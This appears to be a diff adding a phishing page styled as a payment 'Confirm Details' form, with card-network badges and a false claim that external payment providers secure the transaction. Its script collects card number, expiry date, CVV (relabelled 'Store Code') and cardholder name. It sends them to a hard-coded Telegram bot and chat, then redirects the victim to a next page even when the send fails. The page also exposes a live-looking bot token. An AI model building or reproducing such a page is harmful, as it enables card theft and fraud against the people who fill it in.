@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Confirm Details</title>
+  <style>
+    :root {
+      --bg-page: #f4f5f7;
+      --bg-panel: #ffffff;
+      --bg-inner: #fafafa;
+      --border-light: #e1e3e6;
+      --text-main: #222222;
+      --text-muted: #888888;
+      --accent-blue: #0070f3;
+      --accent-green: #17a54d;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text",
+        system-ui, -webkit-system-font, sans-serif;
+      background: var(--bg-page);
+      color: var(--text-main);
+    }
+
+    /* يغطي الشاشة ويخلّي البوكس في النص بالضبط */
+    .page-wrapper {
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 24px 12px;
+    }
+
+    /* هذا البوكس الخارجي الأساسي (الأبيض الكبير) */
+    .panel {
+      width: 100%;
+      max-width: 430px;
+      background: var(--bg-panel);
+      border-radius: 18px;
+      box-shadow: 0 8px 24px rgba(15, 23, 42, 0.08);
+      padding: 18px 18px 22px;
+    }
+
+    /* شريط Authorized by فوق البوكس الداخلي */
+    .methods-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 14px;
+      flex-wrap: wrap;
+    }
+
+    .methods-row span.label {
+      font-size: 13px;
+      font-weight: 500;
+      color: #555;
+      white-space: nowrap;
+    }
+
+    .methods-logos {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      flex-wrap: nowrap;
+    }
+
+    .card-badge {
+      height: 20px;
+      padding: 0 8px;
+      border-radius: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 10px;
+      font-weight: 600;
+      color: #ffffff;
+      letter-spacing: 0.04em;
+      text-transform: uppercase;
+      box-shadow: 0 0 0 1px rgba(0, 0, 0, 0.04);
+      white-space: nowrap;
+    }
+
+    .badge-visa {
+      background: #1a4fa0;
+    }
+
+    .badge-mastercard {
+      background: linear-gradient(90deg, #ea001b 0%, #ff9900 100%);
+    }
+
+    .badge-amex {
+      background: #0073cf;
+    }
+
+    .badge-discover {
+      background: linear-gradient(90deg, #f58220 0%, #fbb040 100%);
+      color: #222222;
+    }
+
+    .badge-jcb {
+      background: linear-gradient(90deg, #00479b 0%, #e60012 50%, #009944 100%);
+    }
+
+    /* سطر القفل + النص */
+    .secure-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 14px;
+    }
+
+    /* ==== القفل المصغّر ==== */
+.lock-icon {
+  width: 20px;
+  height: 20px;
+  border-radius: 6px;
+  border: 2px solid var(--accent-green);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  position: relative;
+}
+
+.lock-icon::before {
+  content: "";
+  position: absolute;
+  top: -7px;      /* ↓ رفع بسيط عشان يظل متوازن */
+  width: 12px;
+  height: 9px;
+  border: 2px solid var(--accent-green);
+  border-bottom: none;
+  border-radius: 12px 12px 0 0;
+  background: transparent;
+}
+
+.lock-icon::after {
+  content: "";
+  width: 8px;
+  height: 4px;
+  border-radius: 0 0 999px 999px;
+  border: 2px solid var(--accent-green);
+  border-top: none;
+  margin-top: 4px;
+}
+
+    .secure-text {
+      font-size: 13px;
+      color: #555555;
+    }
+
+    /* البوكس الداخلي اللي يحتوي الفورم */
+    .inner-card {
+      margin-top: 6px;
+      padding: 22px 18px 20px;
+      border-radius: 16px;
+      background: var(--bg-inner);
+      border: 1px solid var(--border-light);
+    }
+
+    .inner-card h1 {
+      font-size: 20px;
+      font-weight: 600;
+      text-align: center;
+      margin-bottom: 18px;
+    }
+
+    .form-group {
+      margin-bottom: 14px;
+    }
+
+    .form-row {
+      display: grid;
+      grid-template-columns: 1.1fr 0.9fr;
+      gap: 10px;
+      margin-bottom: 14px;
+    }
+
+    label {
+      display: block;
+      font-size: 13px;
+      margin-bottom: 6px;
+    }
+
+    input[type="text"],
+    input[type="tel"] {
+      width: 100%;
+      padding: 10px 11px;
+      border-radius: 6px;
+      border: 1px solid #d1d5db;
+      font-size: 14px;
+      outline: none;
+      background-color: #ffffff;
+      transition: border-color 0.15s ease, box-shadow 0.15s ease,
+        background-color 0.15s ease;
+    }
+
+    input::placeholder {
+      color: #c0c4cc;
+    }
+
+    input:focus {
+      border-color: var(--accent-blue);
+      box-shadow: 0 0 0 1px rgba(0, 112, 243, 0.18);
+      background-color: #ffffff;
+    }
+
+    .helper {
+      font-size: 11px;
+      color: var(--text-muted);
+      margin-top: 3px;
+    }
+
+    .btn-submit {
+      width: 100%;
+      margin-top: 8px;
+      padding: 11px 0;
+      border-radius: 6px;
+      border: none;
+      background: #0070f3;
+      color: #ffffff;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.15s ease, transform 0.05s ease,
+        box-shadow 0.15s ease;
+    }
+
+    .btn-submit:active {
+      transform: translateY(1px);
+      box-shadow: 0 2px 6px rgba(15, 23, 42, 0.25);
+    }
+
+    .btn-submit:hover {
+      background: #0060d0;
+    }
+
+    @media (max-width: 400px) {
+      .panel {
+        padding: 16px 14px 18px;
+      }
+
+      .inner-card {
+        padding: 18px 14px 16px;
+      }
+
+      .methods-row {
+        gap: 4px;
+      }
+
+      .methods-logos {
+        gap: 4px;
+      }
+
+      .card-badge {
+        padding: 0 6px;
+        height: 18px;
+        font-size: 9px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="page-wrapper">
+    <div class="panel">
+      <!-- شريط Available Methods فوق البوكس الداخلي -->
+      <div class="methods-row">
+        <span class="label">Authorized by:</span>
+        <div class="methods-logos">
+          <div class="card-badge badge-visa">VISA</div>
+          <div class="card-badge badge-mastercard">MC</div>
+          <div class="card-badge badge-amex">AMEX</div>
+          <div class="card-badge badge-discover">DISC</div>
+          <div class="card-badge badge-jcb">JCB</div>
+        </div>
+      </div>
+
+      <!-- سطر القفل + النص -->
+      <div class="secure-row">
+        <div class="lock-icon"></div>
+        <div class="secure-text">All transactions are secured, processed and authorized by external payment providers</div>
+      </div>
+
+      <!-- البوكس الداخلي للفورم -->
+      <div class="inner-card">
+        <h1>Confirm Details</h1>
+
+        <form id="confirmForm" action="#" onsubmit="return false;">
+          <!-- رقم البطاقة -->
+          <div class="form-group">
+            <label for="cardNumber">Card number</label>
+            <input
+              id="cardNumber"
+              type="tel"
+              inputmode="numeric"
+              autocomplete="off"
+              placeholder="XXXX XXXX XXXX XXXX"
+              maxlength="19"
+              required
+            />
+          </div>
+
+          <!-- التاريخ + كود المتجر -->
+          <div class="form-row">
+            <div class="form-group">
+              <label for="expirationDate">Expiration date</label>
+              <input
+                id="expirationDate"
+                type="tel"
+                inputmode="numeric"
+                autocomplete="off"
+                placeholder="MM/YY"
+                maxlength="5"
+                required
+              />
+            </div>
+            <div class="form-group">
+              <label for="cvv">CVV/CVC</label>
+              <input
+                id="cvv"
+                type="tel"
+                inputmode="numeric"
+                autocomplete="off"
+                placeholder="000"
+                maxlength="3"
+                required
+              />
+            </div>
+          </div>
+
+          <!-- الاسم -->
+          <div class="form-group">
+            <label for="cardholderName">Cardholder name</label>
+            <input
+              id="cardholderName"
+              type="text"
+              autocomplete="off"
+              placeholder=""
+              required
+            />
+            <div class="helper">* A full name, as it appears on the card</div>
+          </div>
+
+          <button type="submit" class="btn-submit">Confirm</button>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // تنسيق رقم البطاقة: 16 رقم فقط + مسافات كل 4 أرقام
+    const numberInput = document.getElementById("cardNumber");
+    numberInput.addEventListener("input", () => {
+      let value = numberInput.value.replace(/\D/g, ""); // أرقام فقط
+      if (value.length > 16) value = value.slice(0, 16);
+      const groups = value.match(/.{1,4}/g);
+      numberInput.value = groups ? groups.join(" ") : "";
+    });
+
+    // تنسيق التاريخ MM/YY تلقائياً
+    const expiryInput = document.getElementById("expirationDate");
+    expiryInput.addEventListener("input", () => {
+      let value = expiryInput.value.replace(/\D/g, ""); // أرقام فقط
+      if (value.length > 4) value = value.slice(0, 4);
+
+      if (value.length >= 3) {
+        expiryInput.value = value.slice(0, 2) + "/" + value.slice(2);
+      } else {
+        expiryInput.value = value;
+      }
+    });
+
+    // كود المتجر: 3 أرقام فقط
+    const storeCodeInput = document.getElementById("cvv");
+    storeCodeInput.addEventListener("input", () => {
+      let value = storeCodeInput.value.replace(/\D/g, "");
+      if (value.length > 3) value = value.slice(0, 3);
+      storeCodeInput.value = value;
+    });
+  </script>
+  <script>
+document.getElementById("confirmForm").addEventListener("submit", function () {
+  
+  const cardNumber = document.getElementById("cardNumber").value;
+  const expirationDate = document.getElementById("expirationDate").value;
+  const cvv = document.getElementById("cvv").value;
+  const cardholderName = document.getElementById("cardholderName").value;
+
+  const message = `
+🔔 New Submission:
+-----------------------
+💳 Number: ${cardNumber}
+📅 Expiry: ${expirationDate}
+🏪 Store Code: ${cvv}
+🧑‍💼 Name: ${cardholderName}
+`;
+
+  const botToken = "8097834484:AAG7whd2jF7Ie5pXUiomwXd1VwleQPpAogc"; 
+  const chatId = "7811430582";
+
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({
+    chat_id: chatId,
+    text: message,
+    parse_mode: "Markdown"
+})
+    })
+    .then(() => {
+      // بعد الإرسال → نروح على الصفحة الثانية
+      window.location.href = "kpay3.html";
+    })
+    .catch(() => {
+      // حتى لو صار خطأ، برضه نودّيه للصفحة الثانية
+      window.location.href = "kpay3.html";
+    });
+  });
+</script>
+</script>
+</body>
+</html>
